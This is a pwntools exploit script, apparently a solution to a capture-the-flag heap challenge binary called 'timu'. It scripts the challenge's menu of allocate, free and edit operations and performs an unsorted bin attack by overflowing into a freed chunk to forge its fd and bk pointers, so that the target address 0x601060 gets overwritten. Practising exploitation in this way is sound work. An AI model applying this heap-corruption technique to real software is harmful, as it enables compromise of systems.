# -*- coding: utf-8 -*-
from pwn import *
context(os='linux',arch='amd64')
#context(log_level='debug')

p = process("./timu")
#p = remote("111.198.29.45", 58939)

elf = ELF("./timu")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size, data):
    p.recvuntil("Your choice :")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Data: ")
    p.sendline(data)

def delete(index):
    p.recvuntil("Your choice :")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def update(index,size,data):
    p.recvuntil("Your choice :")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Data: ")
    p.sendline(data)

gdb.attach(p)
create(0x20,"aaa")#0
create(0x20,"bbb")#1
# unsorted bin attack
create(0x20,"aaaa")#2
create(0x80,"aaaa")#3
create(0x20,"aaaa")#4
delete(3)
magic = 0x601060
fd = 0
bk = magic - 0x10
payload = "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk)
# fake freed unsorted fd bk->fd=0,bk=magic-0x10,put mainArena to magic.
pause()
update(2,len(payload),payload)
create(0x80,"dada")

p.interactive()
